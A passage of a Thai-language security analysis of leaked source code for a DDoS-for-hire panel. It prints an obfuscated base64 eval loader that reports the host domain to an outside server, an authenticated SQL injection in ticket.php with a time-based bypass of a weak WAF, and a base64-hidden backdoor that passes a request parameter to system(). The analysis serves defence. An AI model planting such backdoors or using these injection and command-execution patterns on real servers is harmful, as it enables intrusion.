$code = base64_decode("ZnVuY3Rpb24gZ2V0UmVhbElwQWRkcigpeyBpZighZW1wdHkoXCRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXSkpeyBcJGlwID0gXCRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXTsgfSBlbHNlaWYoIWVtcHR5KFwkX1NFUlZFUlsnSFRUUF9DTElFTlRfSVAnXSkpIHsgXCRpcCA9IFwkX1NFUlZFUlsnSFRUUF9DTElFTlRfSVAnXTsgfSBlbHNlaWYoIWVtcHR5KFwkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpIHsgXCRpcCA9IFwkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXTsgfSBlbHNlIHsgXCRpcCA9IFwkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsgfSByZXR1cm4gXCRpcDsgfSBcJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPSBnZXRSZWFsSXBBZGRyKCk7IHJlcXVpcmUoJ2Z1bmN0aW9ucy5waHAnKTsgXCR1c2VyID0gbmV3IHVzZXI7IFwkc3RhdHMgPSBuZXcgc3RhdHM7IFwkZGVzaWduID0gbmV3IGRlc2lnbjsgXCRkb21haW49XCRfU0VSVkVSWydTRVJWRVJfTkFNRSddOyBcJHByb2R1Y3Q9XCIzXCI7IFwkbGljZW5zZVNlcnZlciA9IFwiaHR0cHM6Ly93d3cudnBuYmlkLmJpZC9hcGkvXCI7IFwkcG9zdHZhbHVlPVwiZG9tYWluPVwkZG9tYWluJnByb2R1Y3Q9XCIudXJsZW5jb2RlKFwkcHJvZHVjdCk7IFwkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoXCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgY3VybF9zZXRvcHQoXCRjaCwgQ1VSTE9QVF9VUkwsIFwkbGljZW5zZVNlcnZlcik7IGN1cmxfc2V0b3B0KFwkY2gsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KFwkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywgXCRwb3N0dmFsdWUpOyBcJHJlc3VsdD0ganNvbl9kZWNvZGUoY3VybF9leGVjKFwkY2gpLCB0cnVlKTsgY3VybF9jbG9zZShcJGNoKTsgCgo=");
eval("return eval(\"$code\");");
```

การเก็บข้อมูลโดยนำไปผ่านฟังก์ชัน `base64_encode()` มักเป็นความพยายามพื้นฐานที่ผู้พัฒนาเลือกใช้เพื่อลักลอบฝังซอร์สโค้ดบางอย่างเอาไว้ โค้ดตัวอย่างด้านบนจะมีการเรียกใช้ฟังก์ชัน `base64_decode()` แล้วนำผลลัพธ์ที่ได้มาเก็บไว้ในตัวแปร `$code` ก่อนจะมีการเรียกใช้ผ่านฟังก์ชัน `eval()` 

หากเราดูเนื้อหาในตัวแปร `$code` ก่อนจะผ่านฟังก์ชัน `eval()` เราจะเห็นโค้ดตามตัวอย่างด้านล่าง (มีการจัดรูปแบบโค้ดใหม่เพื่อให้อ่านได้ง่ายขึ้น)

```php
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$_SERVER['REMOTE_ADDR'] = getRealIpAddr();
require('functions.php');
$user = new user;
$stats = new stats;
$design = new design;

$domain = $_SERVER['SERVER_NAME'];
$product = "3";
$licenseServer = "https://www.vpnbid.bid/api/";
$postvalue = "domain=$domain&product=" . urlencode($product);
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, $licenseServer);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postvalue);
$result = json_decode(curl_exec($ch), true);
curl_close($ch);
```

โค้ดด้านบนสามารถถูกอธิบายโดยแบ่งออกเป็น 3 ส่วนดังนี้

1. ส่วนฟังก์ชัน `getRealIpAddr()` เป็นฟังก์ชันสำหรับใช้ในการหาหมายเลขไอพีแอดเดสที่มีการเชื่อมต่อมายังเซิร์ฟเวอร์ที่ซอร์สโค้ดนี้ทำงาน
2. ส่วนการสร้างออบเจ็กต์ `$user`, `$stats` และ `$design` จากคลาสซึ่งอยู่ในไฟล์ `includes/functions.php` ลักษระการเรียกใช้งานดูเกี่ยวข้องกับการทำงานโดยทั่วไปของแพลตฟอร์ม
3. ส่วนการเก็บข้อมูลตำแหน่งที่อยู่ของเซิร์ฟเวอร์ที่ซอร์สโค้ดนี้ทำงานในตัวแปร `$domain` และส่งไปยังโดเมนที่ระบุในตัวแปร `$licenseServer`

ลักษณะซึ่งปรากฎในส่วนที่ 3 นั้นบ่งชี้ให้เห็นว่าเมื่อใดก็ตามที่ชุดซอร์สโค้ดนี้ถูกนำไปใช้งาน โค้ดจะมีการส่งข้อมูลตำแหน่งที่อยู่ของเซิร์ฟเวอร์ที่โฮสต์ซอร์สโค้ดเอาไว้จาก `$_SERVER['SERVER_NAME']` และส่งไปยัง `www.vpnbid.bid/api/` เสมอในลักษณะของข้อมูล telemetry ในทางกลับกัน ผู้ซึ่งครอบครองโดเมน `vpnbid.bid` จะได้รับข้อมูลโดยอัตโนมัติว่ามีใครใช้งานซอร์สโค้ดชุดนี้อยู่บ้าง

ลักษณะการมีอยู่ของ telemetry เป็นดาบสองคม ในกรณีที่ระบบมีช่องโหว่อยู่ การมีอยู่ของโค้ด telemetry จะทำให้ผู้ที่ได้รับ telemetry data รู้ได้ทันทีว่ามีใครนำซอฟต์แวร์ไปใช้บ้าง และสามารถเลือกโจมตีระบบด้วยช่องโหว่ที่มีอยู่ในระบบได้

เมื่อตรวจสอบข้อมูลของผู้ถือครองโดเมน `vpnbid.bid` โดเมนดังกล่าวเคยถูกจดทะเบียนในช่วงวันที่ 24 กันยายน 2017 และมีข้อมูลการใช้งานครั้งสุดท้าย 22 ตุลาคม 2018 ปัจจุบันไม่มีการถือครองโดเมนนี้แล้ว ซึ่งสามารถถูกตีความได้ว่าผู้ไม่ประสงค์สามารถสวมรอยโดยจดทะเบียนและถือครองโดเมน `vpnbid.bid` เอาไว้และรอข้อมูล telemetry data เพื่อแสวงหาประโยชน์ได้

## Authenticated SQL Injection

แม้ว่า SQL query โดยส่วนใหญ่ซึ่งปรากฎในชุดซอร์สโค้ดจะมีการใช้ prepared statements และหลีกเลี่ยงการนำ untrusted data จากผู้ใช้งานมาใส่ใน SQL query โดยตรง การอ่านซอร์สโค้ดกลับพบว่ามี SQL query ในบางไฟล์ซึ่งยังคงไม่ได้มีการปฏิบัติตามแนวทางดังกล่าว และเปิดช่องทางให้เกิดการช่องโหว่ในลักษณะของ SQL injection ได้

ซอร์สโค้ดด้านล่างคือซอร์สโค้ดในไฟล์ `ticket.php` ซึ่งปรากฎอยู่ที่ตำแหน่ง `admin/ticket.php` และ `staff/ticket.php` ด้วยตำแหน่งของไฟล์ การจะเข้าถึงไฟล์ `ticket.php` ได้นั้น ผู้ใช้งานจะต้องมี rank ในระบบเป็นกลุ่มเจ้าหน้าที่ของระบบ (staff) หรือผู้ดูแลระบบ (admin) ก่อน

```php
<?php
ob_start();
require_once('../includes/db.php');
require_once('../includes/init.php'); 

$id = $_GET['id'];
$SQLGetTickets = $odb->query("SELECT * FROM `tickets` WHERE `id` = {$_GET['id']}");
while ($getInfo = $SQLGetTickets->fetch(PDO::FETCH_ASSOC)) {
	$username = htmlspecialchars($getInfo['username']);
	$subject = htmlspecialchars($getInfo['subject']);
	$status = htmlspecialchars($getInfo['status']);
	$original = htmlspecialchars($getInfo['content']);
	$date = htmlspecialchars(date("m-d-Y, h:i:s a", $getInfo['date']));
}

include 'header.php';
$page = "Reply to Ticket";

?>
```

จากซอร์สโค้ดด้านบน เราจะสามารถสังเกตเห็นได้ว่าโค้ดมีการรับพารามิเตอร์ `id` จาก HTTP GET request มาใส่ไว้ในตัวแปร `$id` จากนั้นตัวแปรดังกล่าวถูกนำมาใช้ใน SQL query ซึ่งเก็บผลลัพธ์ไว้ในตัวแปร `$SQLGetTickets` โดยทันที ด้วยลักษณะของโค้ดดังกล่าว เราสามารถโจมตีในลักษณะของ SQL injection โดยการ inject ผ่านพารามิเตอร์ `id` ในลักษณะ `http://<URL>/[admin||staff]/ticket.php?id=[sql]`

อย่างไรก็ตามชุดซอร์สโค้ด DDoSaaS ที่เราตรวจสอบอยู่นี้มีการฝังฟังก์ชัน Web application firewall (WAF) สำเร็จรูปเอาไว้ อ้างอิงจากโค้ดในไฟล์ `includes/db.php`

```php
<?php

// Before of all your CODE.
require('waf.php');
$xWAF = new xWAF();
$xWAF->start();
// Your code below.

error_reporting(0);
@ini_set('display_errors', 0);

	if(strpos(strtolower($_SERVER['SCRIPT_NAME']),strtolower(basename(__FILE__)))){
		die('Error, Your IP Address Has Been Logged!');
	}
	define('DB_HOST', 'localhost');
	define('DB_NAME', 'stresser');
	define('DB_USERNAME', 'root');
	define('DB_PASSWORD', '');
	define('ERROR_MESSAGE', 'Database error');
	
	try {
	$odb = new PDO('mysql:host=' . DB_HOST . ';dbname=' . DB_NAME, DB_USERNAME, DB_PASSWORD);
	$odb->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
	$odb->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	
	}catch (PDOException $ex){
    echo ERROR_MESSAGE;
}
```

เฟรมเวิร์คของ WAF ที่มีการใช้งานนั้นถูกระบุว่าเป็นเฟรมเวิร์คจากโครงการ [Alemalakra/xWAF](https://github.com/Alemalakra/xWAF) ซึ่งถูกอัปเดตล่าสุดเมื่อ 2 ปีที่ผ่านมาและไม่มีการอัปเดตใด ๆ อีก หากดูในซอร์สโค้ดของฟังก์ชัน [`sqlCheck()`](https://github.com/Alemalakra/xWAF/blob/master/xwaf.php#L102) ซึ่งปรากฎในไฟล์ `waf.php` เราจะพบว่ามาตรการของ xWAF ที่ใช้เพื่อตอบโต้การโจมตีมีเพียงการตรวจสอบ SQL query ในลักษณะ blacklisting เพื่อหาการใช้คำต้องห้าม[ซึ่งถูกกำหนดไว้อย่างไม่ครอบคลุม](https://github.com/Alemalakra/xWAF/blob/master/xwaf.php#L35)

{{< image src="https://i.imgur.com/UoopYyO.png" alt="" position="center" style="border-radius: 8px;" >}}

ด้วยเงื่อนไขดังกล่าว การโจมตีโดยใช้เทคนิค SQL injection ก็ยังคงเกิดขึ้นได้แม้จะมี WAF มาขวางหน้า โดยอาศัยเทคนิค time-based blind และใช้คำสั่ง SQL อย่าง `SLEEP()` ที่ไม่ได้อยู่ใน blacklist เนื่องจากผลลัพธ์ของการโจมตีไม่ได้ปรากฎขึ้นมาให้เห็นโดยตรงแต่สามารถถูกตรวจสอบได้จาก side-channel อย่างเช่นเวลาในการประมวลผล

## Remote Code Execution via Backdoor Code

แม้จะไม่สามารถบอกได้อย่างชัดเจนถึงสาเหตุที่ความเสี่ยงอย่างการส่งข้อมูล telemetry ไปยังระบบอื่นหรือช่องโหว่ SQL injection นั้นเกิดขึ้น ผมกลับค่อนข้างมั่นใจว่าความเสี่ยงต่อไปนี้นั้นมีความตั้งใจที่ชัดเจนให้มันคงอยู่เพื่อใช้ประโยชน์ในลักษณะของช่องทางลับหรือ Backdoor

ความเสี่ยงนี้ปรากฎอยู่ในไฟล์ `h.php` ซึ่งทำหน้าที่แสดงส่วน header ของหน้าเว็บไซต์ ด้วยหน้าที่ของไฟล์ `h.php` ซึ่งจำเป็นต่อการแสดงผล โค้ดในไฟล์ `h.php` จึงถูกเรียกใช้ผ่านฟังก์ชัน `include()` จากหลายไฟล์ในชุดซอร์สโค้ด อาทิ `boottest.php`, `dashboard.php`, `gift.php`, `news.php`, `purchase.php`, `s.php`, `stress.php` และ `t.php`

โค้ดดังกล่าวมีลักษณะตามตัวอย่างด้านล่าง

```php
<head>
	<?php if (isset($_REQUEST[base64_decode('YWNjZXNz')])) {
		echo base64_decode('PHByZT4=');
		$k0 = ($_REQUEST[base64_decode('YWNjZXNz')]);
		system($k0);
		echo base64_decode('PC9wcmU+');
		die;
	} ?> <script src="https://www.google.com/recaptcha/api.js" async defer></script>
```

โค้ดด้านบนจะทำงานก็ต่อเมื่อมีการส่งพารามิเตอร์ซึ่งเมื่อผ่านฟังก์ชัน `base64_decode()` แล้วได้คำว่า `access` ถูกกำหนดค่าเอาไว้ โดยหากมีการส่งค่ามาทางพารามิเตอร์ `access` หน้าเว็บเพจจะแสดงโค้ด HTML `<pre>` ซึ่งเกิดจากการนำค่า `PHByZT4=` ไปผ่านฟังก์ชัน `base64_decode()` และนำข้อมูลที่มากับพารามิเตอร์ `access` ไปรันในฟังก์ชัน `system()` ซึ่งเทียบเท่ากับการรันคำสั่งของระบบ

ด้วยเงื่อนไขของโค้ด Backdoor นี้ ผู้โจมตีสามารถทำ remote code execution โดยใช้เงื่อนไขของโค้ด Backdoor จากหน้าเว็บไซต์ที่มีการโหลดไฟล์ `h.php` มาใช้ได้ในลักษณะ `http://<URL>/[vulnerable_file].php?access=[command]`

{{< image src="https://i.imgur.com/oiU8IMw.png" alt="" position="center" style="border-radius: 8px;" >}}

จากลักษณะของโค้ดที่ฝังเอาไว้ ความพยายามในใช้ฟังก์ชัน `base64_decode()` เพื่อการปกปิดและผลกระทบที่เกิดจากโค้ด มีความเป็นไปได้สูงว่ามีผู้ตั้งใจฝังโค้ด Backdoor นี้เอาไว้เพื่อใช้หาประโยชน์จากผู้ที่นำซอร์สโค้ดนี้ไปใช้โดยไม่มีการตรวจสอบ

# Final Note

บริการในกลุ่ม DDoSaaS เป็นบริการซึ่งเกิดใหม่ได้ง่ายตราบเท่าที่ยังมีผู้ใช้งานซึ่งแสวงหาอำนาจในการโจมตีระบบอื่นภายใต้เงื่อนไขของความง่ายเพียงแค่จ่ายเงินและระบุเป้าหมาย เงื่อนไขเหล่านี้เป็นเงื่อนไขหนึ่งซึ่งทำให้การรับมือและตอบสนองต่อการโจมตี DDoS อยู่ที่การเตรียมความพร้อมเพื่อยืนหยัดไว้ให้ได้นานที่สุด และเสีย Availability ให้น้อยที่สุดจากการโจมตี ชัยชนะต่อการรับมือสถานการณ์นี้จะถูกประเมินจากผู้ที่มีทรัพยากรที่มากกว่า หรือมีความพร้อมมากกว่านั่นเอง
